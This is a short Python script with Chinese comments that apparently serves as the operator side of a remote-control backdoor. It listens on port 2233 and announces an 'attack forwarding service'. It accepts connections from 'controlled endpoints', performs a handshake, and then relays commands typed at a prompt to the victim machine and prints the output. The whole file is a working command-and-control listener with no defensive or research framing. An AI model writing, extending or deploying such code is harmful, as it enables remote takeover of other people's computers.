import time

import socket
#声明主机
host = ""
#声明端口号
port = 2233
#创建sock套接字
sock = socket.socket()
#绑定主机和端口
sock.bind((host, port))
#开始监听
sock.listen(5)
#对话循环

print("攻击转发服务启动！")
all_time = ""

while True:

	cli, addr = sock.accept()
	print("\n\n客户端接入！")
	print(addr)

	#接收模式识别
	mod = cli.recv(2048).decode()

	'''
	#模式为验证更新
	if mod == "heart":
		cli.sendall("my".encode())
		print("被控端接入！")
		print(time.strftime("%Y-%m-%d %H:%M:%S", time.localtime()))

		uuid = cli.recv(2048).decode()
		cli.sendall("stop".encode())


	'''	
	cli.sendall("my".encode())
	print("被控端接入！")
	print(time.strftime("%Y-%m-%d %H:%M:%S", time.localtime()))

	uuid = cli.recv(2048).decode()
	cli.sendall("start".encode())

	while True:
		cmd = input(">>>")
		cli.sendall(cmd.encode())
		print(cli.recv(2048).decode())